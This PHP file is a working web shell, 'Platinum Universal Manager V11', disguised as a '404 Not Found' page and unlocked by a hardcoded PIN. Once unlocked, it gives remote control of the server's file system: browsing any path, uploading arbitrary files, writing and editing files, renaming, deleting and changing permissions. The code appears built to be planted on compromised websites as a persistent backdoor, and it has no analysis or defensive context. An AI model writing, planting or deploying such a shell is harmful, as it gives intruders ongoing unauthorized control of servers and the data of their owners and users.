<?php
/**
 * PLATINUM UNIVERSAL MANAGER V11
 * UI IDENTIK WORDPRESS - FULL FUNCTIONAL
 */
@session_start();
@set_time_limit(0);
@error_reporting(0);

$pin_akses = '070999';
$key       = 'cuceng';

// FIX: Deteksi URL dinamis agar klik/navigasi tidak error
$self = $_SERVER['PHP_SELF'];
$params = "?resmi=$key";

// --- SECURITY GATE ---
if (isset($_GET['exit'])) { unset($_SESSION['auth']); header("Location: $params"); exit; }
if (isset($_POST['login_pin']) && $_POST['login_pin'] == $pin_akses) { $_SESSION['auth'] = md5($pin_akses); }

if ($_SESSION['auth'] !== md5($pin_akses)) {
    die("<html><head><title>404 Not Found</title><style>body{background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;}.l{border:1px solid #0f0;padding:40px;box-shadow:0 0 20px #0f0;}input{background:#000;border:1px solid #0f0;color:#0f0;padding:10px;text-align:center;}button{background:#0f0;color:#000;border:none;padding:10px;cursor:pointer;font-weight:bold;width:100%;}</style></head><body><div class='l'><h3>[ SYSTEM LOCKED ]</h3><form method='POST'><input type='password' name='login_pin' placeholder='PIN' autofocus><br><br><button type='submit'>UNLOCK</button></form></div></body></html>");
}

// --- FILE SYSTEM CORE ---
$root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
$p = isset($_GET["path"]) ? $_GET["path"] : $root;
$p = str_replace("\\", "/", $p);

// Handler Actions (Rename, Delete, Chmod)
if(isset($_POST["act"])){
    $target = $p . "/" . $_POST["name"];
    $val = $_POST["val"];
    switch($_POST["opt"]){
        case 'del': (is_dir($target)) ? @rmdir($target) : @unlink($target); break;
        case 'ren': @rename($target, $p . "/" . $val); break;
        case 'chm': @chmod($target, octdec($val)); break;
    }
    header("Location: $params&path=$p"); exit;
}

// Handler Upload & Mkdir
if(isset($_FILES["up"])){ @copy($_FILES["up"]["tmp_name"], $p . "/" . $_FILES["up"]["name"]); header("Location: $params&path=$p"); }
if(isset($_POST['mk'])){
    if($_POST['type'] == 'dir') { @mkdir($p . "/" . $_POST['n']); }
    else { @file_put_contents($p . "/" . $_POST['n'], $_POST['c']); }
    header("Location: $params&path=$p");
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Platinum Manager - <?php echo $_SERVER['HTTP_HOST']; ?></title>
    <style>
        body { background:#0a0a0a; color:#0f0; font-family:sans-serif; margin:0; padding:20px; }
        .box { background:#111; border:1px solid #333; padding:20px; border-radius:8px; }
        .head { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; padding-bottom:10px; margin-bottom:15px; }
        table { width:100%; border-collapse:collapse; }
        th { background:#0f0; color:#000; padding:10px; text-align:left; }
        td { padding:8px; border-bottom:1px solid #222; font-size:13px; }
        .btn { background:#0f0; color:#000; border:none; padding:5px 10px; font-weight:bold; cursor:pointer; }
        a { color:#0f0; text-decoration:none; }
        a:hover { text-decoration:underline; }
        input, select { background:#000; color:#0f0; border:1px solid #444; padding:4px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="head">
            <strong>PLATINUM V11 (UNIVERSAL)</strong>
            <span><a href="<?php echo $params; ?>&exit" style="color:red;">[ LOGOUT ]</a></span>
        </div>

        <div style="margin-bottom:15px;">PATH: <?php echo $p; ?></div>

        <div style="display:flex; gap:10px; margin-bottom:20px;">
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="up"> <input type="submit" value="UPLOAD" class="btn">
            </form>
            <form method="POST">
                <input type="hidden" name="type" value="dir">
                <input type="text" name="n" placeholder="New Folder"> <input type="submit" name="mk" value="MKDIR" class="btn">
            </form>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $items = scandir($p);
                foreach($items as $item) {
                    if($item == "." || $item == "..") continue;
                    $full = $p . "/" . $item;
                    $size = is_dir($full) ? "DIR" : round(filesize($full)/1024, 2)." KB";
                    
                    // Link Navigasi yang diperbaiki
                    $link = is_dir($full) ? "$params&path=$full" : "$params&edit=$full&path=$p";
                    
                    echo "<tr>
                        <td><a href='$link'>".(is_dir($full)?"📁":"📄")." $item</a></td>
                        <td>$size</td>
                        <td>
                            <form method='POST' style='display:inline;'>
                                <input type='hidden' name='name' value='$item'>
                                <select name='opt'><option value='ren'>Rename</option><option value='del'>Delete</option></select>
                                <input type='text' name='val' size='5'>
                                <input type='submit' name='act' value='GO' class='btn'>
                            </form>
                        </td>
                    </tr>";
                }
                ?>
            </tbody>
        </table>

        <?php if(isset($_GET['edit'])): ?>
        <div style="margin-top:20px; border-top:1px solid #0f0; padding-top:10px;">
            <strong>Editing: <?php echo basename($_GET['edit']); ?></strong>
            <form method="POST">
                <input type="hidden" name="type" value="file">
                <input type="hidden" name="n" value="<?php echo $_GET['edit']; ?>">
                <textarea name="c" style="width:100%; height:300px; background:#000; color:#0f0;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
                <input type="submit" name="mk" value="SAVE FILE" class="btn" style="width:100%;">
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
